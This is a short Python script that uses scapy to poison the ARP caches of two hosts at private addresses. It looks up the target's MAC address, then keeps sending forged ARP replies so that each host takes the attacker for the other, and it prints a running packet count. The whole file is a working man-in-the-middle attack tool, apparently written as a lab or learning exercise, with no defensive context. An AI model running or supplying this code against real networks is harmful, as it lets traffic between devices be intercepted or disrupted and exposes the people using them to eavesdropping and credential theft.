#!/usr/bin/env python3

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

sent_packet_count = 0
while True:
    spoof("192.168.12.135", "192.168.12.2")
    spoof("192.168.12.2", "192.168.12.135")
    sent_packet_count = sent_packet_count + 2
    print("[+] packets sent: " + str(sent_packet_count))
    time.sleep(2)
